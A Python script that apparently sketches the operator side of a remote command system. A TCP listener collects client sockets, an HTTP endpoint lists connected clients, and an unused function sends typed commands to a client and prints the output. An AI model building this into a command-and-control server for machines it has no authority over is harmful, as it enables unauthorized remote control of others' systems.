import socket
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import json

HOST = "localhost"
PORT_TCP = 8888
PORT_HTTP_SERVER = 8880

clients_socket = dict()

def test_command(client_socket):
    cmd = input("Enter command: ")

    # send the command to the client 
    client_socket.send(cmd.strip().encode())

    # receive the output from the client
    output = client_socket.recv(1024).decode()
    print(output)


def tcp_server():
    # create server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # bind server socket to port
    server_socket.bind((HOST, PORT_TCP))

    # listen for connections
    server_socket.listen(1)

    # accept connections
    while True:
        # accept connection
        client_socket, addr = server_socket.accept()

        # get the client full address
        ip_addr = str(addr[0]) + ':' + str(addr[1])

        # add client socket to dictionary
        clients_socket[ip_addr] = client_socket


# class that models the http server
class HTTPServerStructure(BaseHTTPRequestHandler):
    def do_GET(self):
        match self.path:
            case "/clients":
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()

                # transform the list of the dictionary keys to json
                clients_json = json.dumps(list(clients_socket.keys()))

                # send the json to the client
                self.wfile.write(clients_json.encode())


def http_server():
    server = HTTPServer((HOST, PORT_HTTP_SERVER), HTTPServerStructure)
    server.serve_forever()


if __name__ == '__main__':
    # create the tcp server thread
    tcp_server_thread = threading.Thread(target=tcp_server)
    tcp_server_thread.start()

    # create the http server thread
    http_server_thread = threading.Thread(target=http_server)
    http_server_thread.start()

    # wait for the threads to finish
    tcp_server_thread.join()
    http_server_thread.join()